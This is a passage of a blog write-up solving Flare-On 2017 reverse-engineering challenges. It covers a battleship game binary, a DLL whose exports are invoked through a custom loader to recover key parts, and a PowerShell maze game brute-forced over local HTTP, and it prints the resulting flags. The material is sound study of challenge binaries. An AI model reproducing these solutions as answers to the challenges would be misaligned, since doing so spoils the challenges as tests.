</span><span>time_t </span><span style=color:#8fa1b3>time</span><span>(time_t *</span><span style=color:#bf616a>t</span><span>){ </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>; }
</span><span style=color:#b48ead>int </span><span style=color:#8fa1b3>rand</span><span>(</span><span style=color:#b48ead>void</span><span>){ </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>; }
</span></code></pre><p>With randomness out of the way, our board game with the position of all the ships will be the same at every runtime.<p>The function <code>draw_grid()</code> called with a pointer to the game board as parameter. By reading it, the function knows how to print a cell (empty, full) and therefore knows the configuration of the board.<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>gef➤  bp *0x403c3a
</span><span>gef➤  dps $rdi l1
</span><span>0x0000000000614010│+0x00: 0x0008087808087800	 ← $rax, $rdi
</span></code></pre><p>This is a bitmask representing the position of the board: to make easier I wrote a Python function to convert this value into a list of position on the board:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>>  </span><span style=color:#2b303b;background-color:#bf616a>def</span><span> </span><span style=color:#bf616a>convert_to_solution</span><span>(rdi):
</span><span>        line = </span><span style=color:#96b5b4>bin</span><span>(rdi)[</span><span style=color:#d08770>2</span><span>:].</span><span style=color:#bf616a>rjust</span><span>(</span><span style=color:#d08770>64</span><span>,'</span><span style=color:#a3be8c>0</span><span>')
</span><span>        table = [line[i:i+</span><span style=color:#d08770>8</span><span>] </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>0</span><span>, </span><span style=color:#96b5b4>len</span><span>(line), </span><span style=color:#d08770>8</span><span>)][::-</span><span style=color:#d08770>1</span><span>]
</span><span>        </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#96b5b4>len</span><span>(table)):
</span><span>            row = table[i][::-</span><span style=color:#d08770>1</span><span>]
</span><span>            </span><span style=color:#b48ead>for </span><span>j </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#96b5b4>len</span><span>(row)):
</span><span>                </span><span style=color:#b48ead>if </span><span>row[j] == '</span><span style=color:#a3be8c>1</span><span>':
</span><span>                    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#d08770>%c%c </span><span>" % ( </span><span style=color:#96b5b4>chr</span><span>(i+</span><span style=color:#96b5b4>ord</span><span>('</span><span style=color:#a3be8c>A</span><span>')), </span><span style=color:#bf616a>str</span><span>(j+</span><span style=color:#d08770>1</span><span>)), </span><span style=color:#bf616a>end</span><span>="")
</span><span>                </span><span style=color:#b48ead>else</span><span>:
</span><span>                    </span><span style=color:#96b5b4>print</span><span>("   ", </span><span style=color:#bf616a>end</span><span>="")
</span><span>            </span><span style=color:#96b5b4>print</span><span>("")
</span><span>
</span><span>>>> </span><span style=color:#bf616a>convert_to_solution</span><span>(</span><span style=color:#d08770>0x0008087808087800</span><span>)
</span><span>
</span><span>         B4 B5 B6 B7
</span><span>         C4
</span><span>         D4
</span><span>         E4 E5 E6 E7
</span><span>         F4
</span><span>         G4
</span><span>
</span><span>>>>
</span></code></pre><p>We get 2 things: one, we have all the positions for the enemy boats; two, the disposition of the boats on the board forms an ASCII letter (here ‘F’).<p>By advancing through all the levels, we can collect more letters:<ol><li>0x0008087808087800 → “f”<li>0x008888f888888800 → “h”<li>0x7e8181f10101817e → “g”<li>0xf090909090000000 → “u”<li>0x0000f8102040f800 → “z”<li>0x0000000905070907 → “r”<li>0x7010701070000000 → “e”<li>0x0006090808083e00 → “j”<li>0x1028444444000000 → “v”<li>0x0c1212120c000000 → “o”</ol><p>Reaching the final level and entering the valid positions of boats gets a message:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Final answer:
</span><span>Aye! You found some letters did ya? To find what you're looking for, you'll want to
</span><span>re-order them:
</span><span>9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4.
</span><span>
</span><span>Next you let 13 ROT in the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE.
</span><span>
</span><span>Thanks for playing!
</span></code></pre><p>By simply applying this formula, we find the result to be <code>ohgjurervfgurehz</code> which when in uppercase ROT13-ed gives <code>BUTWHEREISTHERUM</code>. Give this password as input, and after a bit of computation time obtain the key to finish the level:</p><a href=/img/flareon-2017/532e605c764a754f32dbb0d2581913dbf0283d76e21f12cbf92841cfae67f8c4.png target=_blank> <img alt=image_alt src=/img/flareon-2017/532e605c764a754f32dbb0d2581913dbf0283d76e21f12cbf92841cfae67f8c4.png title=image_alt width=100%> </a><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-6>Challenge 6</h1><h1 id=instruction-5>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>I hope you enjoyed your game. I know I did. We will now return to the topic of
</span><span>cyberspace electronic computer hacking and digital software reverse
</span><span>engineering.
</span></code></pre><h1 id=solution-5>Solution</h1><p><a rel="noopener nofollow noreferrer" href=https://mega.nz/#!Nd5g3ToA!ArZp4KMqteCSQQwywP2LE-xdYly-UoQEBoig4CfCuIY target=_blank><code>payload.dll</code></a> is a PE32+ DLL x86-64. The DLL doesn’t sweat much info out of the box, so I decide to use both dynamic and static analysis. Although the static part is perfectly handled by IDA, I wanted the dynamic analysis to be custom so I had to make a small loader for this library.<p>Since the notation is <a rel="noopener nofollow noreferrer" href=http://www.agner.org/optimize/calling_conventions.pdf target=_blank>stdecl</a>, the arguments are passed to registers in the following order: rcx, rdx, r8, r9<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>windows.h</span><span>>
</span><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>stdint.h</span><span>>
</span><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>stdio.h</span><span>>
</span><span style=color:#b48ead>#include </span><span><</span><span style=color:#a3be8c>stdlib.h</span><span>>
</span><span style=color:#b48ead>#define </span><span>DLL_LOCATION </span><span style=color:#bf616a>TEXT</span><span>("</span><span style=color:#a3be8c>F:</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>flareon_2017</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>6</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>payload.dll</span><span>")
</span><span>
</span><span style=color:#b48ead>typedef void </span><span>(__stdcall *FuncType)(uint64_t, uint64_t, uint64_t, uint64_t);
</span><span>
</span><span style=color:#65737e>/* Call the location at `addr` with [a1 .. a4] as arguments. */
</span><span style=color:#b48ead>void </span><span style=color:#8fa1b3>CallWithArgs</span><span>(uintptr_t </span><span style=color:#bf616a>addr</span><span>, uint64_t </span><span style=color:#bf616a>a1</span><span>, uint64_t </span><span style=color:#bf616a>a2</span><span>, uint64_t </span><span style=color:#bf616a>a3</span><span>, uint64_t </span><span style=color:#bf616a>a4</span><span>)
</span><span>{
</span><span>    </span><span style=color:#bf616a>PrintDebug</span><span>("</span><span style=color:#a3be8c>[+] calling %1!p!</span><span style=color:#96b5b4>\n</span><span>", (va_list*)&addr);
</span><span>    </span><span style=color:#bf616a>DebugBreak</span><span>();
</span><span>    ((FuncType)(addr))(a1,a2,a3,a4);
</span><span>}
</span><span>
</span><span style=color:#65737e>/* Print debug message directly in WinDBG. */
</span><span>VOID </span><span style=color:#8fa1b3>PrintDebug</span><span>(LPTSTR </span><span style=color:#bf616a>pMsgFmt</span><span>, va_list* </span><span style=color:#bf616a>pArgs</span><span>)
</span><span>{
</span><span>    CHAR pMsg[</span><span style=color:#d08770>128</span><span>] = {</span><span style=color:#d08770>0</span><span>,};
</span><span>    </span><span style=color:#bf616a>FormatMessage</span><span>(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY,
</span><span>                  pMsgFmt, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0</span><span>, pMsg, sizeof(pMsg), (va_list*)pArgs);
</span><span>    </span><span style=color:#bf616a>OutputDebugString</span><span>(pMsg);
</span><span>    </span><span style=color:#b48ead>return</span><span>;
</span><span>}
</span><span>
</span><span style=color:#65737e>/* main() */
</span><span style=color:#b48ead>int </span><span>WINAPI </span><span style=color:#8fa1b3>WinMain</span><span>(HINSTANCE </span><span style=color:#bf616a>hInstance</span><span>, HINSTANCE </span><span style=color:#bf616a>hPrevInstance</span><span>, LPSTR </span><span style=color:#bf616a>lpCmdLine</span><span>, </span><span style=color:#b48ead>int </span><span style=color:#bf616a>nCmdShow</span><span>)
</span><span>{
</span><span>        HMODULE handle = </span><span style=color:#bf616a>LoadLibraryEx</span><span>(DLL_LOCATION, </span><span style=color:#d08770>NULL</span><span>, </span><span style=color:#d08770>0</span><span>);
</span><span>        </span><span style=color:#bf616a>PrintDebug</span><span>("</span><span style=color:#a3be8c>[+] DLL allocated at %1!p!</span><span style=color:#96b5b4>\n</span><span>", (va_list*)&handle);
</span><span>        </span><span style=color:#bf616a>DebugBreak</span><span>();
</span><span>        </span><span style=color:#65737e>/* do more stuff here */
</span><span>        </span><span style=color:#bf616a>FreeLibrary</span><span>(handle);
</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>}
</span></code></pre><p>With this simple library loader, I have an accurate way of invoking any location withing the DLL and display runtime information directly inside WinDBG.<p>IDA quickly pointed me to the function at offset 0x5A50 - which I’ve called <code>Func3()</code>. The loop at 0x180005B05 is a simple <code>strcmp()</code> like loop comparing <code>arg1</code> (that we control) to a value from the DLL.<p>When WinDBG break at this location, we can get the value of the value our argument is compared to:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#d08770>0</span><span>:</span><span style=color:#d08770>000</span><span>> bp payload+</span><span style=color:#d08770>0x5b05
</span><span style=color:#d08770>0</span><span>:</span><span style=color:#d08770>000</span><span>> g
</span><span>Breakpoint </span><span style=color:#d08770>0</span><span> hit
</span><span>payload+</span><span style=color:#d08770>0x5b05</span><span>:
</span><span style=color:#d08770>000007</span><span style=color:#2b303b;background-color:#bf616a>fe</span><span>`f38e5b05 </span><span style=color:#d08770>0</span><span style=color:#2b303b;background-color:#bf616a>fb610</span><span>          movzx   edx,byte ptr [rax] ds:</span><span style=color:#d08770>000007</span><span style=color:#2b303b;background-color:#bf616a>fe</span><span>`f38e4240=</span><span style=color:#d08770>6</span><span style=color:#b48ead>f
</span><span style=color:#d08770>0</span><span>:</span><span style=color:#d08770>000</span><span>> da rax
</span><span style=color:#d08770>000007</span><span style=color:#2b303b;background-color:#bf616a>fe</span><span>`f38e4240  "</span><span style=color:#a3be8c>orphanedirreproducibleconfidence</span><span>"
</span><span style=color:#d08770>000007</span><span style=color:#2b303b;background-color:#bf616a>fe</span><span>`f38e4260  "</span><span style=color:#a3be8c>s</span><span>"
</span></code></pre><p>Using the loader, we can now invoke this function easily:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>        </span><span style=color:#65737e>// inside WinMain
</span><span>
</span><span>        uintptr_t Func3 = handle + </span><span style=color:#d08770>0x5A50 </span><span>;
</span><span>        PCHAR a3 = "</span><span style=color:#a3be8c>orphanedirreproducibleconfidences</span><span>";
</span><span>        </span><span style=color:#bf616a>CallWithArgs</span><span>(Func3, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0</span><span>, a3, </span><span style=color:#d08770>0</span><span>);
</span></code></pre><p>Which when compiled and executed triggers to display the following MessageBox:</p><a href=/img/flareon-2017/eaca6198b81df65f296bc6d280437944ee7745fae6c9168d2500b12d0a5c1345.png target=_blank> <img alt=image_alt src=/img/flareon-2017/eaca6198b81df65f296bc6d280437944ee7745fae6c9168d2500b12d0a5c1345.png title=image_alt width=100%> </a><p>We get one letter of the key! Good start, but how could we get more? And why do we get the 26th character? To know that we must understand the function 0x180005D30:</p><a href=/img/flareon-2017/a686c1bd8e99734457a6cec1549cfdb8218e5ebaa9e62e412110bb9a9062508e.png target=_blank> <img alt=image_alt src=/img/flareon-2017/a686c1bd8e99734457a6cec1549cfdb8218e5ebaa9e62e412110bb9a9062508e.png title=image_alt width=100%> </a><p>This function gets a pointer to the <a rel="noopener nofollow noreferrer" href=http://resources.infosecinstitute.com/the-export-directory/ target=_blank>Export Directory table</a> then calls the function 0x180004710:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.text:000000018000471E </span><span style=color:#b48ead>mov     </span><span>[</span><span style=color:#bf616a>rsp</span><span>+</span><span style=color:#d08770>48h</span><span>+</span><span style=color:#8fa1b3>var_18</span><span>], </span><span style=color:#bf616a>rax
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004723 </span><span style=color:#b48ead>lea     </span><span style=color:#bf616a>rcx</span><span>, [</span><span style=color:#bf616a>rsp</span><span>+</span><span style=color:#d08770>48h</span><span>+</span><span style=color:#8fa1b3>SystemTime</span><span>]</span><span style=color:#65737e> ; lpSystemTime
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004728 </span><span style=color:#b48ead>call    </span><span style=color:#bf616a>cs</span><span style=color:#8fa1b3>:GetSystemTime
</span><span style=color:#8fa1b3>.text:000000018000472E </span><span style=color:#b48ead>movzx   </span><span style=color:#bf616a>eax</span><span>, [</span><span style=color:#bf616a>rsp</span><span>+</span><span style=color:#d08770>48h</span><span>+</span><span style=color:#8fa1b3>SystemTime.wMonth</span><span>]
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004733 </span><span style=color:#b48ead>movzx   </span><span style=color:#bf616a>ecx</span><span>, [</span><span style=color:#bf616a>rsp</span><span>+</span><span style=color:#d08770>48h</span><span>+</span><span style=color:#8fa1b3>SystemTime.wYear</span><span>]
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004738 </span><span style=color:#b48ead>add     </span><span style=color:#bf616a>eax</span><span>, </span><span style=color:#bf616a>ecx
</span><span style=color:#8fa1b3>.text:000000018000473A </span><span style=color:#b48ead>cdq
</span><span style=color:#8fa1b3>.text:000000018000473B </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>ecx</span><span>, </span><span style=color:#d08770>1Ah
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004740 </span><span style=color:#b48ead>idiv    </span><span style=color:#bf616a>ecx
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>0000000180004742 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>eax</span><span>, </span><span style=color:#bf616a>edx
</span></code></pre><p>Or better in pseudo-code<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#bf616a>GetSystemTime</span><span>(&SystemTime);
</span><span style=color:#b48ead>return </span><span>(SystemTime.</span><span style=color:#bf616a>wYear </span><span>+ SystemTime.</span><span style=color:#bf616a>wMonth</span><span>) % </span><span style=color:#d08770>0x1a</span><span>;
</span></code></pre><p>Since FlareOn goes from September 2017 to October 2017, the possible return values are 24 if executed in September, or 25 if in October. We know why we got <code>key[25]</code> now, but we don’t know where the passphrase comes from. This is done in the function 0x180005C40 that will do the decoding of a part of <code>.rdata</code> at index given by the return of function 0x180004710.<p>So to get the keys, we must decode all sections in <code>.rdata</code>:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>for </span><span>(</span><span style=color:#b48ead>int</span><span> i=</span><span style=color:#d08770>0</span><span>; i<=</span><span style=color:#d08770>24</span><span>; i++){
</span><span>  uint64_t DecodeRdataFunc = </span><span style=color:#d08770>0x5D30</span><span>;
</span><span>  uintptr_t addr = handle + DecodeRdataFunc;
</span><span>  </span><span style=color:#bf616a>CallWithArgs</span><span>(addr, i, p2, p3, p4);
</span><span>}
</span></code></pre><p>The following passphrases are collected:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>PCHAR pPasswords[] = {
</span><span>        "</span><span style=color:#a3be8c>filingmeteorsgeminately</span><span>",
</span><span>        "</span><span style=color:#a3be8c>leggykickedflutters</span><span>",
</span><span>        "</span><span style=color:#a3be8c>incalculabilitycombustionsolvency</span><span>",
</span><span>        "</span><span style=color:#a3be8c>crappingrewardsanctity</span><span>",
</span><span>        "</span><span style=color:#a3be8c>evolvablepollutantgavial</span><span>",
</span><span>        "</span><span style=color:#a3be8c>ammoniatesignifiesshampoo</span><span>",
</span><span>        "</span><span style=color:#a3be8c>majesticallyunmarredcoagulate</span><span>",
</span><span>        "</span><span style=color:#a3be8c>roommatedecapitateavoider</span><span>",
</span><span>        "</span><span style=color:#a3be8c>fiendishlylicentiouslycolouristic</span><span>",
</span><span>        "</span><span style=color:#a3be8c>sororityfoxyboatbill</span><span>",
</span><span>        "</span><span style=color:#a3be8c>dissimilitudeaggregativewracks</span><span>",
</span><span>        "</span><span style=color:#a3be8c>allophoneobservesbashfulness</span><span>",
</span><span>        "</span><span style=color:#a3be8c>incuriousfatherlinessmisanthropically</span><span>",
</span><span>        "</span><span style=color:#a3be8c>screensassonantprofessionalisms</span><span>",
</span><span>        "</span><span style=color:#a3be8c>religionistmightplaythings</span><span>",
</span><span>        "</span><span style=color:#a3be8c>airglowexactlyviscount</span><span>",
</span><span>        "</span><span style=color:#a3be8c>thonggeotropicermines</span><span>",
</span><span>        "</span><span style=color:#a3be8c>gladdingcocottekilotons</span><span>",
</span><span>        "</span><span style=color:#a3be8c>diagrammaticallyhotfootsid</span><span>",
</span><span>        "</span><span style=color:#a3be8c>corkerlettermenheraldically</span><span>",
</span><span>        "</span><span style=color:#a3be8c>ulnacontemptuouscaps</span><span>",
</span><span>        "</span><span style=color:#a3be8c>impureinternationalisedlaureates</span><span>",
</span><span>        "</span><span style=color:#a3be8c>anarchisticbuttonedexhibitionistic</span><span>",
</span><span>        "</span><span style=color:#a3be8c>tantalitemimicryslatted</span><span>",
</span><span>        "</span><span style=color:#a3be8c>basophileslapsscrapping</span><span>",
</span><span>        "</span><span style=color:#a3be8c>orphanedirreproducibleconfidences</span><span>"
</span><span>};
</span></code></pre><p>And then force calling the <code>Func3()</code> function with the specific password:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>addr = mz + Func3;
</span><span>p3 = (uint64_t)pPasswords[i];
</span><span style=color:#bf616a>CallWithArgs</span><span>(addr, p1, p2, p3, p4);
</span></code></pre><p>That will print out successively the key parts via successive <code>MessageBox</code> calls.<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0x77, 0x75, 0x75, 0x75, 0x74, 0x2d, 0x65, 0x78, 0x70, 0x30, 0x72, 0x74,
</span><span>0x73, 0x40, 0x66, 0x6c, 0x61, 0x72, 0x65, 0x2d, 0x6f, 0x6e, 0x2e, 0x63,
</span></code></pre><p>which translated gives <code>wuuut-exp0rts@flare-on.com</code><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-7>Challenge 7</h1><h1 id=instruction-6>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>I want to play another game with you, but I also want you to be challenged
</span><span>because you weren't supposed to make it this far.
</span></code></pre><h1 id=solution-6>Solution</h1><p><a rel="noopener nofollow noreferrer" href=https://mega.nz/#!BQIlHJ6Z!_-qOpHyiXaZqq2CV_o42du5blCGmkzrlJKrXs6WG2oU target=_blank><code>zsud.exe</code></a> is a PE32 binary. Running <code>strings</code> and <code>binwalk</code> against it immediately shows 2 things:<ol><li>this binary is C# compiled<li>it embeds a DLL</ol><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span>  binwalk zsud.exe
</span><span>
</span><span style=color:#bf616a>DECIMAL</span><span>       HEXADECIMAL     DESCRIPTION
</span><span style=color:#bf616a>0</span><span>             0x0             Microsoft executable, portable (PE)
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>356528</span><span>        0x570B0         Microsoft executable, portable (PE)
</span><span style=color:#bf616a>362328</span><span>        0x58758         Base64 standard index table
</span></code></pre><p>This DLL, <code>flareon.dll</code>, can be easily extracted with a simple <code>dd</code> command, and shows some strings like “<code>soooooo_sorry_zis_is_not_ze_flag</code>”, but not really interesting (yet). Debugging the binary with <code>dnSpy</code> gives a whole new view as to what it’s doing: the function <code>Smth()</code> receives a Base64 encoded string, which once decoded is AES decrypted with the key “<code>soooooo_sorry_zis_is_not_ze_flag</code>”. The result is a Powershell script that is being invoked, and that is another maze game, entirely written in Powershell. The script can be downloaded <a rel="noopener nofollow noreferrer" href=https://gist.github.com/750558c5ed49c291e50dc460821e8e09 target=_blank>here</a>.</p><a href=/img/flareon-2017/090d3fe35ac25fcec9052f0e216f72c75da6d96a367abe4451d04ff0af7ad5cd.png target=_blank> <img alt=image_alt src=/img/flareon-2017/090d3fe35ac25fcec9052f0e216f72c75da6d96a367abe4451d04ff0af7ad5cd.png title=image_alt width=100%> </a><p>The game is an escape room, so it would make sense that the flag will be given to us if we escape! And since it’s a maze, we need to find the proper directions, which comes into 2 parts.<h3 id=first-part-of-the-directions>First part of the directions</h3><p>Getting the first part of the directions is relatively simple. <code>zsud.exe</code> starts a webservice on <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L814 target=_blank>127.0.0.1/9999</a> so it is possible to brute-force the first directions by generating HTTP requests and analysing the output:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>send</span><span>(</span><span style=color:#bf616a>directions</span><span>, </span><span style=color:#bf616a>description</span><span>, </span><span style=color:#bf616a>verbose</span><span>=</span><span style=color:#d08770>False</span><span>):
</span><span>    url = "</span><span style=color:#a3be8c>http://</span><span>"+"</span><span style=color:#a3be8c>192.168.221.4:9998/some/thing.asp?k=</span><span style=color:#d08770>{k:s}</span><span style=color:#a3be8c>&e=</span><span style=color:#d08770>{e:s}</span><span>".</span><span style=color:#bf616a>format</span><span>(</span><span style=color:#bf616a>k</span><span>=directions, </span><span style=color:#bf616a>e</span><span>=description)
</span><span>    h = requests.</span><span style=color:#bf616a>get</span><span>(url)
</span><span>    </span><span style=color:#b48ead>if </span><span>h.status_code==</span><span style=color:#d08770>200 </span><span>or "</span><span style=color:#a3be8c>@</span><span>" in h.text: </span><span style=color:#b48ead>return </span><span>h.text
</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#d08770>None
</span><span>
</span><span>key_directions = {</span><span style=color:#d08770>0</span><span>: "</span><span style=color:#a3be8c>n</span><span>", </span><span style=color:#d08770>1</span><span>:"</span><span style=color:#a3be8c>s</span><span>", </span><span style=color:#d08770>2</span><span>:"</span><span style=color:#a3be8c>e</span><span>", </span><span style=color:#d08770>3</span><span>:"</span><span style=color:#a3be8c>w</span><span>", </span><span style=color:#d08770>4</span><span>:"</span><span style=color:#a3be8c>u</span><span>", </span><span style=color:#d08770>5</span><span>:"</span><span style=color:#a3be8c>d</span><span>" }
</span><span>directions = ""
</span><span>d = key_desc.</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>]
</span><span>prefix = []
</span><span>i = </span><span style=color:#d08770>0
</span><span>
</span><span style=color:#b48ead>while </span><span style=color:#d08770>True</span><span>:
</span><span>    valid = </span><span style=color:#d08770>False
</span><span>    </span><span style=color:#b48ead>for </span><span>c </span><span style=color:#b48ead>in </span><span>key_directions.</span><span style=color:#bf616a>keys</span><span>():
</span><span>        temp = directions + key_directions[c]
</span><span>        desc = d.</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>+</span><span>', '</span><span style=color:#a3be8c>-</span><span>').</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>/</span><span>', '</span><span style=color:#a3be8c>_</span><span>').</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>=</span><span>', '</span><span style=color:#a3be8c>%3D</span><span>')
</span><span>        p = </span><span style=color:#bf616a>send</span><span>(temp, desc)
</span><span>        </span><span style=color:#b48ead>if </span><span>p:
</span><span>            directions = temp
</span><span>            p, s = p.</span><span style=color:#bf616a>split</span><span>()
</span><span>            prefix.</span><span style=color:#bf616a>append</span><span>(p)
</span><span>            </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[!] dir='</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>' prefix='</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>' next='</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>...'</span><span>" % (directions, ' '.</span><span style=color:#bf616a>join</span><span>(prefix), s[:</span><span style=color:#d08770>16</span><span>]))
</span><span>            d = s
</span><span>            valid = </span><span style=color:#d08770>True
</span><span>    </span><span style=color:#b48ead>if </span><span>not valid:
</span><span>        </span><span style=color:#b48ead>break
</span><span>    i+=</span><span style=color:#d08770>1
</span></code></pre><p>And we start getting the beginning of the path: <a href=/img/flareon-2017/304507dabd5f847b7beafec89b19e225540db7649cedfc0e2ebe4703df14a06b.png target=_blank> <img alt=image_alt src=/img/flareon-2017/304507dabd5f847b7beafec89b19e225540db7649cedfc0e2ebe4703df14a06b.png title=image_alt width=100%> </a><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>directions ='</span><span style=color:#a3be8c>wnneesssnewne</span><span>'
</span><span>prefix = '</span><span style=color:#a3be8c>You can start to make out some words but you need to follow the</span><span>'
</span></code></pre><h3 id=second-part-of-the-directions>Second part of the directions</h3><p>By following the directions found above, we end up in the “infinite maze of cubicles” (<a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L148 target=_blank>confirmed by the PowerShell script</a>). The cubicles are linked through random connections to one another. To find the way, we must be able to predict the generation. At <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L431-L432 target=_blank>line 431</a> we see that if we transfer the key (located in the desk drawer), the script will trigger a call to <code>srand(42)</code>. The implementation of <code>msvcrt::rand()</code> is an known algorithm that goes along the lines of<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>seed = </span><span style=color:#d08770>42
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>rand</span><span>():
</span><span>    </span><span style=color:#b48ead>global </span><span>seed
</span><span>    new_seed = (</span><span style=color:#d08770>0x343fd </span><span>* seed + </span><span style=color:#d08770>0x269ec3</span><span>) & ((</span><span style=color:#d08770>1 </span><span><< </span><span style=color:#d08770>32</span><span>) - </span><span style=color:#d08770>1</span><span>)
</span><span>    randval = (new_seed >> </span><span style=color:#d08770>0x10</span><span>) & </span><span style=color:#d08770>0x7fff
</span><span>    seed = new_seed
</span><span>    </span><span style=color:#b48ead>return </span><span>randval
</span></code></pre><p>Which now makes the path predictable, and we get the final directions:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>directions += '</span><span style=color:#a3be8c>ewwwdundundunsuneunsewdunsewsewsewsewdun</span><span>'
</span></code></pre><h3 id=final-wrap-up>Final wrap-up</h3><p>If we now follow the entire directions found above <code>wnneesssnewne</code> + <code>ewwwdundundunsuneunsewdunsewsewsewsewdun</code>, we get the final message <code>RIGHT_PATH!@66696e646b6576696e6d616e6469610d0a</code>, so the complete answer to the maze is<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>directions ='</span><span style=color:#a3be8c>wnneesssnewneewwwdundundunsuneunsewdunsewsewsewsewdun</span><span>'
</span><span>prefix = '</span><span style=color:#a3be8c>You can start to make out some words but you need to follow the RIGHT_PATH!@66696e646b6576696e6d616e6469610d0a</span><span>'
</span></code></pre><p>But still no flag. The hex-encoded block right next to <code>RIGHT_PATH</code> says to:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> "</span><span style=color:#a3be8c>66696e646b6576696e6d616e6469610d0a</span><span>".</span><span style=color:#bf616a>decode</span><span>('</span><span style=color:#a3be8c>hex</span><span>')
</span><span>'</span><span style=color:#a3be8c>findkevinmandia</span><span style=color:#96b5b4>\r\n</span><span>'
</span></code></pre><p>By going back to the Powershell script using Powershell ISE, we notice that the only place Kevin is mentioned is in the function <code>Invoke-Say()</code>. We then seek the function <code>Invoke-Say()</code> and force the <code>if</code> branch to be taken by setting the <code>$helmet</code> variable to not None, and the <code>$key</code> to the path we found:<pre class=language-perl data-lang=perl style=color:#c0c5ce;background-color:#2b303b><code class=language-perl data-lang=perl><span>$</span><span style=color:#bf616a>key </span><span>= "</span><span style=color:#a3be8c>You can start to make out some words but you need to follow the RIGHT_PATH!</span><span>@</span><span style=color:#bf616a>66696</span><span style=color:#a3be8c>e646b6576696e6d616e6469610d0a</span><span>"
</span><span>$</span><span style=color:#bf616a>helmet </span><span>= </span><span style=color:#d08770>1</span><span>;
